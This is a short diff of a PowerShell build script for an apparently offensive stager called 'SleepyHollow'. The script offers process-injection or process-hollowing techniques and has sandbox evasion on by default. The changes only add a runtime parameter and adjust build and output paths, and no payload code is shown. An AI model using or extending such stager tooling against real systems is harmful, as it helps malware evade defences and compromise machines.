@@ -7,7 +7,10 @@ param(
     [ValidateSet("Inject", "Hollow")]
     [string]$Technique = "Hollow",
     [Parameter(Mandatory=$false, HelpMessage="Disable sandbox evasion")]
-    [switch]$DisableSandboxEvasion
+    [switch]$DisableSandboxEvasion,
+    [Parameter(Mandatory=$false)]
+    [ValidateSet("win-x64")]
+    [string]$Runtime = "win-x64"
 )
 
 $oldContent = [System.IO.File]::ReadAllText(".\Program.cs")
@@ -40,13 +43,13 @@ function Output-Stager{
         [string]$OutputPath = ".\SleepyHollow.exe"
     )
     if(Test-Path $OutputPath){
-        $title    = 'File already exists'
+        $title    = "File " + $OutputPath + " already exists"
         $question = 'Are you sure you want to proceed?'
         $choices  = '&Yes', '&No'
 
         $decision = $Host.UI.PromptForChoice($title, $question, $choices, 1)
         if ($decision -eq 0) {
-            Move-Item ".\bin\Release\net7.0\win-x64\publish\SleepyHollow.exe" $OutputPath -Force
+            Move-Item ".\bin\Release\net7.0\$Runtime\publish\SleepyHollow.exe" $OutputPath -Force
         } else {
             exit
         }
@@ -65,7 +68,7 @@ function Build-Stager{
     if($DisableSandboxEvasion){
         $CONSTANTS = $CONSTANTS + "%3BNO_SANDBOX"
     }
-    dotnet publish -c Release /p:DefineConstants="$CONSTANTS" --self-contained $projectPath > $null
+    dotnet publish -c Release /p:DefineConstants="$CONSTANTS" --self-contained -r $Runtime $projectPath > $null
 }
 
 Write-Progress -Activity "[SleepyHollow] Updating configuration..." -Status "20% Complete:" -PercentComplete 20
